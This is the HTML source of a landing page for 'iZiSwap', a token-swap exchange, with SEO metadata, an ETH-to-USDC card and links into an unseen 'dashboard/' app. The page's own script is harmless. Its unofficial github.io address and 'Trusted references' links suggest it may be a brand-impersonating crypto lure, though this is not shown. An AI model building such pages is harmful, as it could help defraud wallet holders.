<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta name="description" content="iZiSwap is a decentralized exchange for swapping tokens from your own wallet.">
  <link rel="canonical" href="https://iziswap-page.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F8F8">
  <meta property="og:type" content="website">
  <meta property="og:title" content="iZiSwap">
  <meta property="og:description" content="iZiSwap is a decentralized exchange for swapping tokens from your own wallet.">
  <meta property="og:url" content="https://iziswap-page.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="iZiSwap">
  <meta name="twitter:description" content="iZiSwap is a decentralized exchange for swapping tokens from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://iziswap-page.github.io/#website",
        "url": "https://iziswap-page.github.io/",
        "name": "iZiSwap",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://iziswap-page.github.io/#organization",
        "name": "iZiSwap",
        "url": "https://iziswap-page.github.io/",
        "logo": "https://iziswap-page.github.io/favicon.png"
      },
      {
        "@type": "WebApplication",
        "@id": "https://iziswap-page.github.io/#app",
        "name": "iZiSwap",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://iziswap-page.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>

  <link rel="prefetch" href="dashboard/">
  <link rel="prerender" href="dashboard/">
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="iZiSwap home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>iZiSwap</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://www.coingecko.com/en/exchanges/iziswap" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi</a>
    </nav>
    <span class="sp"></span>
    <a class="ghost" href="dashboard/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="iZiSwap overview">
      <h1>iZiSwap</h1>
      <p class="sub"><strong>iZiSwap</strong> is a decentralized exchange for swapping tokens from your own wallet.</p>
    </section>

    <section class="card" aria-label="Swap route">
      <div class="route">
        <div class="leg">
          <span class="lbl">From</span>
          <span class="chip">
            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
            <span class="token">ETH</span>
          </span>
        </div>
        <button class="dir" type="button" data-dir aria-label="Switch direction">
          <span class="ar" aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="lbl">To</span>
          <span class="chip">
            <img class="ic" src="usdc.png" width="26" height="26" alt="USDC">
            <span class="token">USDC</span>
          </span>
        </div>
      </div>
      <a class="act" href="dashboard/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="foot">iZiSwap &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-dir]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
